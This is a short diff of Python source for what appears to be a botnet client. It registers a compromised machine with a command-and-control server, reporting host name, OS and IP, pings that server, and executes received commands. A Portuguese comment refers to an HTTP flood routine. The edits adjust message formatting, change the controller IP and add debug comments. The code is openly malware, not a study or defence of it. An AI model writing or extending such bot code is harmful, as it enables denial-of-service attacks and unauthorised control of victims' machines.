@@ -68,7 +68,7 @@ def Bot_register(bot_socket, pc_name, operation_system, operation_system_version
   bot_addrres = bot_socket.getsockname()[0]
 
   rg_os = str(operation_system + ' ' + operation_system_version)
-  rg_string = str('Server.RG{%s, %s, %s}' %(pc_name, rg_os, bot_addrres))
+  rg_string = str('Server.RG{"%s", "%s", "%s"}' %(pc_name, rg_os, bot_addrres))
 
   rg_boll = True
 
@@ -78,7 +78,7 @@ def Bot_register(bot_socket, pc_name, operation_system, operation_system_version
       bot_socket.send(rg_string.encode('ascii'))
       rg_boll = False
       
-      return True
+      return True#!rg_boll
 
     except:
       rg_boll = True
@@ -89,7 +89,7 @@ def Bot_register(bot_socket, pc_name, operation_system, operation_system_version
 def Bot_ping(ping_value, bot_socket):
   
   bot_addrres = str(socket.gethostbyname(socket.gethostname()))
-  ping_string = str('Server.PING{%i, %s}' %(ping_value, bot_addrres)) # Server.PING{value, my_ip}
+  ping_string = str('Server.PING{%i, "%s"}' %(ping_value, bot_addrres)) # Server.PING{value, my_ip}
 
   ping_boll = True
 
@@ -178,7 +178,7 @@ def main():
 
   data_command = str('')
 
-  server_ip = str('192.168.0.13')
+  server_ip = str('192.168.0.7')
   server_port = int(9878)
 
   sys_information = platform.uname()
@@ -201,6 +201,8 @@ def main():
     if(data_command != ''):
 
       type_command, format_command = Command_Format(data_command)
+      #print str(type_command) Debug
+      #print str(format_command)
 
       Command_Exec(type_command, format_command, bot_socket)
       # E necessario um time para o processo nao morrer, Talvez editar  o http_flood ja que o time dele nao funciona
